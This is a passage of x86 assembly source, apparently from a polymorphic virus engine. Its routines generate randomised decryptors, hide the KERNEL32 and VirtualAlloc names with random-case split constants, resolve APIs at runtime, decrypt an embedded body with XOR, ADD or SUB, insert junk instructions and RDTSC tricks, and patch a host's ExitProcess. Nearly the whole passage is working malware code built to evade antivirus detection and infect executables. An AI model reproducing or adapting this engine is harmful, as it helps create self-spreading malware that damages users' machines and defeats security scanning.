PatchExitProcess endp

AddUndoAction   proc
                push    edx
                mov     edx, [ebp+MakingFirstHole] 
                or      edx, edx            
                jz    @@Return              
                                            
                                            
                                            
                push    eax
                mov     edx, [ebp+NumberOfUndoActions] 
                add     edx, [ebp+OtherBuffers] 
                mov     [edx], ebx              
                mov     eax, [ebx]              
                mov     [edx+4], eax            
                add     edx, 8
                sub     edx, [ebp+OtherBuffers] 
                mov     [ebp+NumberOfUndoActions], edx 
                pop     eax
   @@Return:    pop     edx
                ret
AddUndoAction   endp


UndoChanges     proc
                mov     edx, [ebp+NumberOfUndoActions] 
                or      edx, edx                  
                jz    @@Ret
                mov     ecx, edx
                sub     edx, 8
                add     edx, [ebp+OtherBuffers]
        @@Loop01:
                mov     ebx, [edx]   
                mov     eax, [edx+4] 
                mov     [ebx], eax   
                sub     edx, 8
                sub     ecx, 8       
                or      ecx, ecx     
                jnz   @@Loop01
        @@Ret:  ret
UndoChanges     endp


APICall_GetModuleHandle proc
                mov     eax, [ebp+FlagAorW] 
                or      eax, eax            
                jz    @@UseGMHA             
                mov     ebx, edx
                add     ebx, 20h    
                mov     ebx, edx
                add     ecx, 10h    
    @@LoopConvertToWideChar:
                mov     eax, [ecx]  
                and     eax, 0FFh   
                mov     [ebx], eax  
                sub     ecx, 1      
                sub     ebx, 2      
                cmp     ecx, edx    
                jnz   @@LoopConvertToWideChar  
    @@UseGMHA:  push    edx                     
                call    dword ptr [ebp+RVA_GetModuleHandle] 
                mov     [ebp+ReturnValue], eax  
                ret
APICall_GetModuleHandle endp



GetFunction     proc
                push    eax
                push    ecx
                push    edx  

                mov     eax, edx  
                push    eax       
                mov     eax, edi
                push    eax
                call    dword ptr [ebp+RVA_GetProcAddress]  
                mov     [ebp+ReturnValue], eax
                pop     edx
                pop     ecx
                pop     eax  
                mov     eax, [ebp+ReturnValue] 
                ret
GetFunction     endp

;----------------------------------------------------------------------------------------

MakeDecryptor   proc

                mov     [ebp+InstructionTable], edi  
                xor     eax, eax
                mov     [ebp+NumberOfLabels], eax    
                mov     [ebp+NumberOfVariables], eax
                mov     eax, edi
                add     eax, 80000h
                mov     [ebp+ExpansionResult], eax

                mov     eax, [ebp+RVA_DataHole]   
                mov     ecx, [ebp+HeaderAddress]  
                add     eax, [ecx+34h]
                mov     [ebp+StartOfEncryptedData], eax

                mov     edx, [ebp+RelocHeader]    
                or      edx, edx                  
                jnz   @@SetDataAtEndOfCryptedCode

                mov     ecx, [ebp+DataHeader]     
                mov     edx, [ebp+HeaderAddress]  
                call    Random                    
                and     eax, 0Fh                  
                add     eax, [ecx+0Ch]            
                add     eax, [edx+34h]            
                jmp   @@SetDecryptorDataSection   
                                                              

      @@SetDataAtEndOfCryptedCode:
                add     eax, [ebp+SizeOfNewCode]  
                and     eax, 0FFFFFFFCh           
                add     eax, 4                    
      @@SetDecryptorDataSection:                  
                mov     [ebp+Decryptor_DATA_SECTION], eax  

                mov     eax, 1                         
                mov     [ebp+CreatingADecryptor], eax  

                call    Poly_MakeRandomExecution  
                                                  
                                                  

                mov     eax, [ebp+VirtualAllocAddress]
                or      eax, eax           
                jnz   @@VirtualAllocAlreadyImported 
                                                    
   
                mov     eax, [ebp+GetModuleHandleMode]
                or      eax, eax                   
                jnz   @@GetModuleHandleUNICODE     

     @@GetModuleHandleASCII:
                call    Random
                and     eax, 20202020h           
                add     eax, 'NREK'              
                mov     [ebp+Poly_FirstPartOfFunction], eax
                call    Random
                and     eax, 00002020h
                add     eax, '23LE'              
                mov     [ebp+Poly_SecondPartOfFunction], eax 
                mov     eax, 2
                call    Random
                and     eax, 1
                jz    @@DontSetExtension0        
                call    Random                   
                and     eax, 20202000h           
                add     eax, 'LLD.'              
        @@DontSetExtension0:
                mov     [ebp+Poly_ThirdPartOfFunction], eax
                xor     eax, eax
                mov     [ebp+AdditionToBuffer], eax 
                                                    
                call    Poly_SetFunctionName     
                jmp   @@NameOfModuleInitialized  

     @@GetModuleHandleUNICODE:                   
                call    Random
                and     eax, 00200020h           
                add     eax, 0045004Bh 
                mov     [ebp+Poly_FirstPartOfFunction], eax
                call    Random
                and     eax, 00200020h
                add     eax, 004E0052h 
                mov     [ebp+Poly_SecondPartOfFunction], eax
                call    Random
                and     eax, 00200020h
                add     eax, 004C0045h 
                mov     [ebp+Poly_ThirdPartOfFunction], eax
                xor     eax, eax
                mov     [ebp+AdditionToBuffer], eax
                call    Poly_SetFunctionName     

                mov     eax, 00320033h 
                mov     [ebp+Poly_FirstPartOfFunction], eax
                mov     eax, 2
                call    Random
                and     eax, 1
                jz    @@DontSetExtension1        
                call    Random                   
                and     eax, 00200000h
                add     eax, 0044002Eh 
          @@DontSetExtension1:
                mov     [ebp+Poly_SecondPartOfFunction], eax
                or      eax, eax
                jz    @@DontSetExtension2
                call    Random
                and     eax, 00200020h
                add     eax, 004C004Ch 
          @@DontSetExtension2:
                mov     [ebp+Poly_ThirdPartOfFunction], eax
                mov     eax, 0Ch
                mov     [ebp+AdditionToBuffer], eax
                call    Poly_SetFunctionName    

   @@NameOfModuleInitialized:
                call    Poly_SelectThreeRegisters          
                mov     edx, [ebp+Decryptor_DATA_SECTION]  
                mov     ecx, [ebp+BufferRegister]
                call    Poly_DoMOVRegValue

                mov     ecx, [ebp+BufferRegister]
                call    Poly_DoPUSHReg                

                mov     ecx, [ebp+GetModuleHandleAddress]
                call    Poly_DoCALLMem                

                mov     eax, 0F6h    
                mov     [edi], eax
                mov     eax, 0808h
                mov     [edi+1], eax
                mov     eax, [ebp+Decryptor_DATA_SECTION]
                add     eax, 10h
                mov     [edi+3], eax
                add     edi, 10h

                mov     eax, 'triV'     
                mov     [ebp+Poly_FirstPartOfFunction], eax 
                mov     eax, 'Alau'                         
                mov     [ebp+Poly_SecondPartOfFunction], eax 
                mov     eax, 'coll'
                mov     [ebp+Poly_ThirdPartOfFunction], eax
                xor     eax, eax
                mov     [ebp+AdditionToBuffer], eax
                call    Poly_SetFunctionName       

                call    Poly_SelectThreeRegisters
                mov     edx, [ebp+Decryptor_DATA_SECTION]
                mov     ecx, [ebp+BufferRegister]
                call    Poly_DoMOVRegValue
                mov     ecx, [ebp+BufferRegister]  
                call    Poly_DoPUSHReg             

                call    Poly_SelectThreeRegisters  
                mov     ecx, [ebp+IndexRegister]   
                mov     ebx, 10h
                call    Poly_DoMOVRegMem
                mov     ecx, [ebp+IndexRegister]
                call    Poly_DoPUSHReg

                mov     ecx, [ebp+GetProcAddressAddress]
                call    Poly_DoCALLMem        

                mov     eax, 0F6h        
                mov     [edi], eax
                mov     eax, 0808h
                mov     [edi+1], eax
                mov     eax, [ebp+Decryptor_DATA_SECTION]
                add     eax, 10h
                mov     [edi+3], eax
                add     edi, 10h
                                         
                mov     [ebp+VirtualAllocAddress], eax 
                                                       
                                                       
   @@VirtualAllocAlreadyImported:
                mov     eax, 8                    
                mov     [ebp+BufferRegister], eax 
                mov     [ebp+CounterRegister], eax
                mov     [ebp+IndexRegister], eax

                mov     edx, 4                
                call    Poly_DoPUSHValue      
                mov     edx, 1000h            
                call    Poly_DoPUSHValue
                call    Random
                and     eax, 01F000h          
                mov     edx, 350000h          
                add     edx, eax
                call    Poly_DoPUSHValue      
                xor     edx, edx              
                call    Poly_DoPUSHValue      

                mov     ecx, [ebp+VirtualAllocAddress]
                call    Poly_DoCALLMem        

                mov     eax, 0F6h             
                mov     [edi], eax
                mov     eax, 0808h
                mov     [edi+1], eax
                mov     eax, [ebp+Decryptor_DATA_SECTION]
                mov     [edi+3], eax
                add     edi, 10h
                                              
                call    Poly_SelectThreeRegisters

                mov     ecx, [ebp+IndexRegister]
                xor     ebx, ebx              
                call    Poly_DoMOVRegMem      

                mov     ecx, [ebp+IndexRegister]
                call    Poly_MakeCheckWith0   
                                              
                mov     eax, 74h              
                mov     [edi], eax            
                mov     [ebp+Poly_Jump_ErrorInVirtualAlloc], edi 
                add     edi, 10h               

                mov     ecx, [ebp+IndexRegister]
                mov     edx, [ebp+New_CODE_SECTION]
                call    Poly_DoADDRegValue    

                mov     ecx, [ebp+IndexRegister]
                mov     ebx, 10h              
                call    Poly_DoMOVMemReg      

                call    Random
                and     eax, 0FC000000h
                mov     edx, [ebp+New_DISASM2_SECTION]
                add     edx, eax
                call    Poly_DoPUSHValue   

                call    Random
                and     eax, 0FC000000h
                mov     edx, [ebp+New_DATA_SECTION]
                add     edx, eax
                call    Poly_DoPUSHValue   

                call    Random
                and     eax, 0FC000000h
                mov     edx, [ebp+New_BUFFERS_SECTION]
                add     edx, eax
                call    Poly_DoPUSHValue   

                call    Random
                and     eax, 0FC000000h
                mov     edx, [ebp+New_DISASM_SECTION]
                add     edx, eax
                call    Poly_DoPUSHValue   

                call    Random
                and     eax, 0FC000000h
                mov     edx, [ebp+New_CODE_SECTION]
                add     edx, eax
                call    Poly_DoPUSHValue   

                mov     edx, [ebp+GetProcAddressAddress]
                call    Poly_DoPUSHValue  

                mov     edx, [ebp+GetModuleHandleAddress]
                call    Poly_DoPUSHValue  

                mov     edx, [ebp+TranslatedDeltaRegister]
                shl     edx, 1
                mov     eax, [ebp+GetModuleHandleMode]
                add     edx, eax
                call    Poly_DoPUSHValue  
                                          


                call    Random            
                mov     ebx, [ebp+SizeOfNewCodeP2]
                sub     ebx, 4
                and     eax, ebx
                mov     [ebp+Poly_InitialValue], eax
                mov     [ebp+CounterValue], eax
                call    Random            
                sub     ebx, 4
                and     eax, ebx
                mov     [ebp+Poly_Addition], eax

                call    Random            
                mov     ebx, [ebp+SizeOfNewCodeP2]
                sub     ebx, 4
                and     eax, ebx
                mov     [ebp+IndexValue], eax

                call    Random                 
                mov     [ebp+BufferValue], eax 

                call    Poly_SelectThreeRegisters 
                                           
                call    Poly_SetValueToRegisters
                                           

                call    Poly_InsertLabel        
                mov     [ebp+Poly_LoopLabel], eax


                mov     ecx, [ebp+IndexRegister]
                call    Poly_DoPUSHReg          

                mov     ecx, [ebp+IndexRegister]
                mov     edx, [ebp+CounterRegister]
                call    Poly_DoXORRegReg        
                                          

                mov     eax, 38h         
                mov     [edi], eax
                mov     eax, [ebp+IndexRegister]
                mov     [edi+1], eax
                mov     eax, [ebp+SizeOfNewCode]
                and     eax, 0FFFFFFFCh
                add     eax, 4
                mov     [edi+7], eax
                add     edi, 10h

                mov     eax, 73h            
                mov     [edi], eax          
                mov     [ebp+Poly_ExcessJumpInstruction], edi
                add     edi, 10h            

                mov     eax, 42h
                mov     [edi], eax          
                mov     eax, [ebp+IndexRegister]
                add     eax, 0800h
                mov     [edi+1], eax
                mov     eax, [ebp+StartOfEncryptedData]
                mov     [edi+3], eax
                mov     eax, [ebp+BufferRegister]
                mov     [edi+7], eax
                add     edi, 10h

                mov     eax, 3            
                call    Random              
                and     eax, 7              
                jz    @@NoEncryption        
                call    Random              
    @@NoEncryption:
                mov     [ebp+EncryptionKey], eax

                mov     ecx, eax            
                or      ecx, ecx            
                jz    @@DontMakeDecryption
     
                
                xor     eax, eax
                call    Random
                and     eax, 1
                jz    @@MethodXOR_prev         
                mov     eax, 1
                call    Random
                and     eax, 1
                jz    @@MethodXOR_prev
                jmp   @@SetMethod
        @@MethodXOR_prev:
                mov     eax, 2
        @@SetMethod:
                mov     [ebp+TypeOfEncryption], eax 
                mov     ecx, [ebp+EncryptionKey]    
                or      eax, eax
                jz    @@MethodADD            
                cmp     eax, 1
                jz    @@MethodSUB            
        @@MethodXOR:
                mov     eax, 30h             
                jmp   @@MakeDecryption
        @@MethodADD:
                neg     ecx                  
        @@MethodSUB:
                xor     eax, eax             
        @@MakeDecryption:                    
                                             
                mov     [edi], eax
                mov     eax, [ebp+BufferRegister]
                mov     [edi+1], eax         
                mov     [edi+7], ecx
                add     edi, 10h

        @@DontMakeDecryption:
                mov     eax, 02h            
                mov     [edi], eax          
                mov     eax, 0808h          
                mov     [edi+1], eax
                mov     eax, [ebp+Decryptor_DATA_SECTION]
                add     eax, 10h
                mov     [edi+3], eax
                mov     eax, [ebp+IndexRegister]  
                mov     [edi+7], eax
                add     edi, 10h

                mov     eax, 43h             
                mov     [edi], eax           
                mov     eax, [ebp+IndexRegister] 
                add     eax, 0800h
                mov     [edi+1], eax

                xor     eax, eax
                mov     [edi+3], eax
                mov     eax, [ebp+BufferRegister]
                mov     [edi+7], eax
                add     edi, 10h

                call    Poly_InsertLabel      
                mov     ebx, [ebp+Poly_ExcessJumpInstruction]  
                mov     [ebx+1], eax          
                                              
                                              

                mov     ecx, [ebp+IndexRegister]
                call    Poly_DoPOPReg         

                call    Random
                and     eax, 1
                jz    @@AddIndexFirst    
    @@AddCounterFirst:                   
                call    Poly_ModifyCounter 
        @@C_SelectAnotherSequence:         
                call    Random             
                and     eax, 3             
                or      eax, eax           
                jz    @@C_SelectAnotherSequence 
                                                
                push    eax                     
                cmp     eax, 1                  
                jnz   @@AddCounterFirst_Next00  
                call    Poly_MaskCounter
        @@AddCounterFirst_Next00:
                call    Poly_ModifyIndex
                pop     eax

                push    eax
                cmp     eax, 2
                jnz   @@AddCounterFirst_Next01
                call    Poly_MaskCounter
        @@AddCounterFirst_Next01:
                call    Poly_MaskIndex
                pop     eax

                cmp     eax, 3
                jnz   @@AddCounterFirst_Next02
                call    Poly_MaskCounter
        @@AddCounterFirst_Next02:
                jmp   @@ModificationMade


    @@AddIndexFirst:                       
                call    Poly_ModifyIndex   
       @@I_SelectAnotherSequence:          
                call    Random             
                and     eax, 3             
                or      eax, eax
                jz    @@I_SelectAnotherSequence

                push    eax
                cmp     eax, 1
                jnz   @@AddIndexFirst_Next00
                call    Poly_MaskIndex
       @@AddIndexFirst_Next00:
                call    Poly_ModifyCounter
                pop     eax

                push    eax
                cmp     eax, 2
                jnz   @@AddIndexFirst_Next01
                call    Poly_MaskIndex
       @@AddIndexFirst_Next01:
                call    Poly_MaskCounter
                pop     eax

                cmp     eax, 3
                jnz   @@AddIndexFirst_Next02
                call    Poly_MaskIndex
       @@AddIndexFirst_Next02:
      

    @@ModificationMade:
                mov     eax, 38h          
                mov     [edi], eax        
                mov     eax, [ebp+CounterRegister]    
                mov     [edi+1], eax                  
                mov     eax, [ebp+Poly_InitialValue]  
                mov     [edi+7], eax
                add     edi, 10h

                mov     eax, 75h          
                mov     [edi], eax
                mov     eax, [ebp+Poly_LoopLabel]
                mov     [edi+1], eax
                add     edi, 10h


                mov     eax, 8        
                mov     [ebp+CounterRegister], eax
                mov     [ebp+BufferRegister], eax

                mov     ecx, [ebp+DeltaRegister]
                mov     [ebp+IndexRegister], ecx
                xor     ebx, ebx
                call    Poly_DoMOVRegMem   

                mov     ecx, [ebp+Decryptor_DATA_SECTION]
                add     ecx, 10h
                call    Poly_DoCALLMem     

                call    Poly_InsertLabel   
                                           
                                           
                mov     edx, [ebp+Poly_Jump_ErrorInVirtualAlloc]
                mov     [edx+1], eax
                mov     edx, [ebp+Poly_JumpRandomExecution] 
                or      edx, edx            
                jz    @@DontSetJump         
                mov     [edx+1], eax

      @@DontSetJump:
                call    Poly_SelectThreeRegisters
                xor     edx, edx
                call    Poly_DoPUSHValue    

                mov     ecx, [ebp+ExitProcessAddress]
                call    Poly_DoCALLMem      

                mov     ebx, [ebp+VarMarksTable]  
                mov     ecx, 2000h       
                xor     eax, eax         
     @@LoopClearMarks:                   
                mov     [ebx], eax
                add     ebx, 4
                sub     ecx, 4
                or      ecx, ecx
                jnz   @@LoopClearMarks

                mov     [ebp+AddressOfLastInstruction], edi 
                mov     eax, [ebp+OtherBuffers]     
                mov     [ebp+JumpsTable], eax       
                add     eax, 8000h                  
                mov     [ebp+FramesTable], eax      

                mov     eax, [ebp+NewAssembledCode]
                push    eax
                mov     eax, [ebp+TranslatedDeltaRegister]
                push    eax

                call    XpandCode          

                mov     eax, [ebp+InstructionTable] 
                mov     [ebp+NewAssembledCode], eax 
                mov     eax, [ebp+ExpansionResult]  
                mov     [ebp+InstructionTable], eax

                mov     eax, [ebp+SizeOfNewCode]    
                push    eax                         
                mov     eax, [ebp+RoundedSizeOfNewCode]
                push    eax
                mov     eax, [ebp+SizeOfNewCodeP2]
                push    eax

                call    AssembleCode        

                mov     eax, [ebp+SizeOfNewCode]     
                mov     [ebp+SizeOfDecryptor], eax   
                mov     eax, [ebp+NewAssembledCode]
                mov     [ebp+AssembledDecryptor], eax

                pop     eax                          
                mov     [ebp+SizeOfNewCodeP2], eax
                pop     eax
                mov     [ebp+RoundedSizeOfNewCode], eax
                pop     eax
                mov     [ebp+SizeOfNewCode], eax

                pop     eax
                mov     [ebp+TranslatedDeltaRegister], eax
                pop     eax
                mov     [ebp+NewAssembledCode], eax

                ret                       
MakeDecryptor   endp

Poly_SetFunctionName proc
                call    Poly_SelectThreeRegisters 

                mov     edx, [ebp+Poly_FirstPartOfFunction]
                mov     [ebp+IndexValue], edx       
                mov     edx, [ebp+Poly_SecondPartOfFunction]
                mov     [ebp+BufferValue], edx
                mov     edx, [ebp+Poly_ThirdPartOfFunction]
                mov     [ebp+CounterValue], edx

                call    Poly_SetValueToRegisters    

                call    Poly_SetPART_ONEtoMemory_GetStartAddress
                mov     ebx, eax
                call    Poly_SetPART_TWOtoMemory_GetStartAddress
                mov     ecx, eax
                call    Poly_SetPART_THREEtoMemory_GetStartAddress
                mov     edx, eax
                call    Poly_RandomCall                                                                                                   

                call    Poly_SelectThreeRegisters  
                mov     ecx, [ebp+IndexRegister]
                xor     edx, edx
                call    Poly_DoMOVRegValue         
                                                   
                                                   

                mov     ebx, [ebp+AdditionToBuffer]
                add     ebx, 0Ch
                mov     ecx, [ebp+IndexRegister]
                call    Poly_DoMOVMemReg           
                ret
Poly_SetFunctionName endp

Poly_InsertLabel proc
                mov     eax, [ebp+LabelTable]     
                mov     ecx, [ebp+NumberOfLabels] 
                or      ecx, ecx
                jz    @@InsertLabel        
       @@LoopFindLabel:
                cmp     [eax], edi         
                jz    @@LabelInserted      
                add     eax, 8
                sub     ecx, 1             
                or      ecx, ecx           
                jnz   @@LoopFindLabel      
       @@InsertLabel:
                mov     [eax], edi         
                mov     [eax+4], edi
                mov     ecx, [ebp+NumberOfLabels]  
                add     ecx, 1                     
                mov     [ebp+NumberOfLabels], ecx
 @@LabelInserted:
                ret             
Poly_InsertLabel endp

Poly_ModifyCounter proc
                call    Random
                and     eax, 3    
                add     eax, 4    
                mov     edx, eax
                mov     ecx, [ebp+CounterRegister]
                call    Poly_DoADDRegValue
                ret
Poly_ModifyCounter endp


Poly_MaskIndex proc
                mov     ecx, [ebp+IndexRegister]
                mov     esi, 1
                jmp     Poly_MaskRegister
Poly_MaskIndex endp



Poly_ModifyIndex proc
                mov     edx, [ebp+Poly_Addition]
                mov     ecx, [ebp+IndexRegister]
                call    Poly_DoADDRegValue
                ret
Poly_ModifyIndex endp


Poly_MaskRegister proc
                mov     eax, 20h     
                mov     [edi], eax
                mov     [edi+1], ecx
                call    Random       
                mov     ebx, [ebp+SizeOfNewCodeP2]  
                mov     ecx, ebx                    
                not     ebx                         
                and     eax, ebx                    
                sub     ecx, esi                    
                or      eax, ecx                    
                neg     esi                         
                and     eax, esi                    
                mov     [edi+7], eax
                add     edi, 10h
                ret
Poly_MaskRegister endp


Poly_MaskCounter proc
                mov     ecx, [ebp+CounterRegister]
                mov     esi, 4
                jmp     Poly_MaskRegister
Poly_MaskCounter endp


Poly_SelectThreeRegisters proc
                mov     eax, 8
                mov     [ebp+IndexRegister], eax   
                mov     [ebp+BufferRegister], eax
                mov     [ebp+CounterRegister], eax

                call    Poly_GetAGarbageRegister    
                mov     [ebp+IndexRegister], eax    
                call    Poly_GetAGarbageRegister    
                mov     [ebp+BufferRegister], eax   
                call    Poly_GetAGarbageRegister    
                mov     [ebp+CounterRegister], eax  
                ret
Poly_SelectThreeRegisters endp



Poly_SetValueToRegisters proc
                call    Poly_SetIndexValue_GetStartAddress 
                mov     ebx, eax                           
                call    Poly_SetBufferValue_GetStartAddress 
                mov     ecx, eax                            
                call    Poly_SetCounterValue_GetStartAddress 
                mov     edx, eax
                call    Poly_RandomCall   
                ret                       
Poly_SetValueToRegisters endp


Poly_SetIndexValue_GetStartAddress:
                call    Poly_RandomCall_GetAddress 
Poly_SetIndexValue proc
                mov     ecx, [ebp+IndexRegister]
                mov     edx, [ebp+IndexValue]
                call    Poly_DoMOVRegValue
                ret
Poly_SetIndexValue endp


Poly_SetBufferValue_GetStartAddress:
                call    Poly_RandomCall_GetAddress
Poly_SetBufferValue proc
                mov     ecx, [ebp+BufferRegister]
                mov     edx, [ebp+BufferValue]
                call    Poly_DoMOVRegValue
                ret
Poly_SetBufferValue endp


Poly_SetCounterValue_GetStartAddress:
                call    Poly_RandomCall_GetAddress
Poly_SetCounterValue proc
                mov     ecx, [ebp+CounterRegister]
                mov     edx, [ebp+CounterValue]
                call    Poly_DoMOVRegValue
                ret
Poly_SetCounterValue endp


Poly_RandomCall_GetAddress proc  
                pop     eax      
                ret              
Poly_RandomCall_GetAddress endp


Poly_SetPART_ONEtoMemory_GetStartAddress:
                call    Poly_RandomCall_GetAddress
Poly_SetPART_ONEtoMemory proc
                mov     ecx, [ebp+IndexRegister]
                mov     ebx, [ebp+AdditionToBuffer]
                call    Poly_DoMOVMemReg
                ret
Poly_SetPART_ONEtoMemory endp

Poly_SetPART_TWOtoMemory_GetStartAddress:
                call    Poly_RandomCall_GetAddress
Poly_SetPART_TWOtoMemory proc
                mov     ecx, [ebp+BufferRegister]
                mov     ebx, [ebp+AdditionToBuffer]
                add     ebx, 4
                call    Poly_DoMOVMemReg
                ret
Poly_SetPART_TWOtoMemory endp

Poly_SetPART_THREEtoMemory_GetStartAddress:
                call    Poly_RandomCall_GetAddress
Poly_SetPART_THREEtoMemory proc
                mov     ecx, [ebp+CounterRegister]
                mov     ebx, [ebp+AdditionToBuffer]
                add     ebx, 8
                call    Poly_DoMOVMemReg
                ret
Poly_SetPART_THREEtoMemory endp

Poly_RandomCall proc
                mov     esi, 5        
     @@Again:   call    Xp_GarbleRegisters
                sub     esi, 1
                or      esi, esi
                jnz   @@Again
                or      ebx, ebx      
                jz    @@DontPush1st
                push    ebx
     @@DontPush1st:
                or      ecx, ecx
                jz    @@DontPush2nd
                push    ecx
     @@DontPush2nd:
                or      edx, edx
                jz    @@DontPush3rd
                push    edx
     @@DontPush3rd:                   
                ret                   
Poly_RandomCall endp

Poly_DoADDRegValue proc
                mov     eax, 3
                call    Random
                and     eax, 1
                jz    @@Direct
                mov     eax, 40h       
                mov     [edi], eax     
                call    Poly_GetAGarbageRegister
                mov     [edi+1], eax
                mov     ebx, eax
                mov     [edi+7], edx
                add     edi, 10h
                mov     eax, 01h       
                mov     [edi], eax
                mov     [edi+1], ebx
                mov     [edi+7], ecx
                add     edi, 10h
                ret
         @@Direct:
                xor     eax, eax       
                mov     [edi], eax
                mov     [edi+1], ecx
                mov     [edi+7], edx
                add     edi, 10h
                ret
Poly_DoADDRegValue endp


Poly_DoMOVRegValue proc
                mov     eax, 2
                call    Random
                and     eax, 1
                jz    @@Direct
                call    Poly_GetAGarbageRegister 
                push    ecx                      
                mov     ecx, eax                 
                call  @@Direct                   
                mov     eax, 41h                 
                mov     [edi], eax
                mov     [edi+1], ecx
                pop     ecx
                mov     [edi+7], ecx
                add     edi, 10h
                ret
    @@Direct:   mov     eax, 40h         
                mov     [edi], eax
                mov     [edi+1], ecx
                mov     [edi+7], edx
                add     edi, 10h
                ret
Poly_DoMOVRegValue endp


Poly_DoXORRegReg proc
                mov     eax, 3
                call    Random
                and     eax, 1
                jz    @@Single
                call    Poly_GetAGarbageRegister
                mov     esi, eax
                mov     eax, 41h      
                mov     [edi], eax
                mov     [edi+1], edx  
                mov     [edi+7], esi
                add     edi, 10h      
                mov     edx, esi      
                                      
    @@Single:   mov     eax, 31h      
                mov     [edi], eax
                mov     [edi+1], edx
                mov     [edi+7], ecx
                add     edi, 10h
                ret
Poly_DoXORRegReg endp


Poly_DoPUSHValue proc
                mov     eax, 2     
                call    Random
                and     eax, 3        
                or      eax, eax      
                jz    @@Direct        
                mov     eax, 40h      
                mov     [edi], eax
                call    Poly_GetAGarbageRegister
                mov     [edi+1], eax
                mov     [edi+7], edx
                add     edi, 10h
                mov     ecx, eax
                call    Poly_DoPUSHReg
                ret

     @@Direct:  mov     eax, 68h
                mov     [edi], eax
                mov     [edi+7], edx
                add     edi, 10h
                ret
Poly_DoPUSHValue endp

Poly_DoPUSHReg  proc
                mov     eax, 50h
                mov     [edi], eax
                mov     [edi+1], ecx
                add     edi, 10h
                ret
Poly_DoPUSHReg  endp

Poly_DoPOPReg   proc
                mov     eax, 58h
                mov     [edi], eax
                mov     [edi+1], ecx
                add     edi, 10h
                ret
Poly_DoPOPReg   endp


Poly_DoMOVMemReg proc
                xor     eax, eax
                call    Random
                and     eax, 1
                jz    @@Direct        
                mov     eax, 41h
                mov     [edi], eax
                mov     [edi+1], ecx  
                call    Poly_GetAGarbageRegister  
                mov     ecx, eax                  
                mov     [edi+7], eax
                add     edi, 10h

    @@Direct:   mov     eax, 43h      
                mov     [edi], eax
                mov     eax, 0808h
                mov     [edi+1], eax
                mov     eax, ebx      
                add     eax, [ebp+Decryptor_DATA_SECTION]  
                mov     [edi+3], eax
                mov     [edi+7], ecx
                add     edi, 10h
                ret
Poly_DoMOVMemReg endp


Poly_DoMOVRegMem proc
                mov     eax, 1
                call    Random
                and     eax, 1
                jz    @@Direct
                push    ecx
                call    Poly_GetAGarbageRegister 
                mov     ecx, eax
                call  @@Direct         
                mov     eax, 41h       
                mov     [edi], eax
                mov     [edi+1], ecx
                pop     ecx
                mov     [edi+7], ecx
                add     edi, 10h
                ret

    @@Direct:   mov     eax, 42h       
                mov     [edi], eax
                mov     eax, 0808h
                mov     [edi+1], eax
                mov     eax, ebx       
                add     eax, [ebp+Decryptor_DATA_SECTION]  
                mov     [edi+3], eax
                mov     [edi+7], ecx
                add     edi, 10h
                ret
Poly_DoMOVRegMem endp


Poly_MakeCheckWith0 proc
                xor     eax, eax
                call    Random
                and     eax, 1
                jnz   @@Single
                mov     eax, 40h            
                mov     [edi], eax          
                call    Poly_GetAGarbageRegister
                mov     [edi+1], eax
                xor     ebx, ebx
                mov     [edi+7], ebx
                add     edi, 10h
                mov     ebx, 39h
                mov     [edi], ebx
                mov     [edi+1], eax
                mov     [edi+7], ecx
                add     edi, 10h
                ret

    @@Single:   mov     eax, 38h      
                mov     [edi], eax
                mov     [edi+1], ecx
                xor     eax, eax
                mov     [edi+7], eax
                add     edi, 10h
                ret
Poly_MakeCheckWith0 endp

Poly_GetAGarbageRegister proc
    @@Again:    call    Random
                and     eax, 7
                cmp     eax, [ebp+IndexRegister]
                jz    @@Again
                cmp     eax, [ebp+CounterRegister]
                jz    @@Again
                cmp     eax, [ebp+BufferRegister]
                jz    @@Again
                cmp     eax, 4
                jz    @@Again
                ret
Poly_GetAGarbageRegister endp

Poly_GetGarbageOneByter proc
                call    Random      
                and     eax, 7
                add     eax, 0F8h   
                cmp     eax, 0FAh   
                jz    @@ReturnCMC   
                cmp     eax, 0FDh   
                jz    @@ReturnNOP   
                cmp     eax, 0FEh   
                jb    @@Return      
     @@ReturnNOP:
                mov     eax, 90h    
     @@Return:  ret
     @@ReturnCMC:
                mov     eax, 0F5h   
                ret
Poly_GetGarbageOneByter endp


Poly_MakeRandomExecution proc
                call    Random
                and     eax, 3
                jnz   @@Normal      
                call    Poly_SelectThreeRegisters   
                mov     ecx, [ebp+IndexRegister]    
                mov     edx, [ebp+Decryptor_DATA_SECTION] 
                call    Random         
                and     eax, 1Ch       
                add     edx, eax       
                cmp     eax, 1Ch       
                jz    @@DontAddMore
                call    Random
                and     eax, 3
                add     edx, eax
       @@DontAddMore:                      
                call    Poly_DoMOVRegValue 
                call    Random                     
                push    eax                        
                mov     edx, eax                   
                mov     ecx, [ebp+BufferRegister]
                call    Poly_DoMOVRegValue
        @@RDTSC_Option0:
                mov     eax, 3
                call    Random
                and     eax, 1
                jz    @@RDTSC_Option2    
                xor     eax, eax
                call    Random
                and     eax, 1
                jz    @@RDTSC_Option3    
        @@RDTSC_Option1:
                call    Random
                and     eax, 0FF000000h  
                add     eax, 000C3310Fh
                jmp   @@RDTSC_SetInstruction
        @@RDTSC_Option2:
                call    Poly_GetGarbageOneByter
                
                add     eax, 0C3310F00h  
                jmp   @@RDTSC_SetInstruction
        @@RDTSC_Option3:
                call    Poly_GetGarbageOneByter
                shl     eax, 10h         
                add     eax, 0C300310Fh
        @@RDTSC_SetInstruction:
                mov     edx, eax         
                pop     eax              
                sub     edx, eax
                mov     ecx, [ebp+BufferRegister]
                call    Poly_DoADDRegValue 
                                           

                mov     eax, 43h         
                mov     [edi], eax
                mov     eax, 0800h
                add     eax, [ebp+IndexRegister]
                mov     [edi+1], eax
                xor     eax, eax
                mov     [edi+3], eax
                mov     eax, [ebp+BufferRegister]
                mov     [edi+7], eax
                add     edi, 10h

                mov     eax, 0ECh        
                mov     [edi], eax
                mov     eax, [ebp+IndexRegister]
                mov     [edi+1], eax     
                add     edi, 10h         

                xor     eax, eax         
                mov     [ebp+IndexRegister], eax
                mov     eax, 8           
                mov     [ebp+BufferRegister], eax
                mov     [ebp+CounterRegister], eax

                mov     eax, 1
                call    Random
                and     eax, 1
                jz    @@DirectTEST
      @@ANDandCheck:
                mov     eax, 20h        
                mov     [edi], eax
                xor     eax, eax
                call    Xpand_ReverseTranslation 
                mov     [edi+1], eax             
                call  @@GetARandomPowerOf2       
                mov     [edi+7], edx
                add     edi, 10h

                xor     eax, eax
                call    Xpand_ReverseTranslation
                mov     ecx, eax
                call    Poly_MakeCheckWith0   
      @@SetTheJump:
                mov     eax, 2
                call    Random
                and     eax, 1
                add     eax, 74h              
                mov     [edi], eax            
